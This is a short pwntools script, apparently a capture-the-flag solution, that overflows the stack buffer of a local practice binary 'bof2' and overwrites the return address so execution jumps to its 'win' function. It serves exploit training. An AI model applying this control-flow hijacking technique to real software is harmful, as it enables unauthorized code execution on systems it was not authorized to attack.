from pwn import *

p = process("./bof2")

win = 0x401176
payload = b"A"*0x98 + p64(win)

p.send(payload)

p.interactive()